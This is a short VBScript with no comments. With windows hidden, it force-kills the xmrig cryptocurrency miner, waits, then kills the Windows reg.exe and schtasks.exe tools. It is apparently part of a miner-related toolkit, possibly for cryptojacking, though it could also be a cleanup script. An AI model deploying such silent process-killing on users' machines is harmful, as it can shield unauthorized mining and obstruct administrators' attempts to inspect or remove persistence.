Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "taskkill /f /im xmrig.exe", 0, True
WScript.Sleep 9000
objShell.Run "taskkill /f /im reg.exe", 0, True
objShell.Run "taskkill /f /im schtasks.exe", 0, True
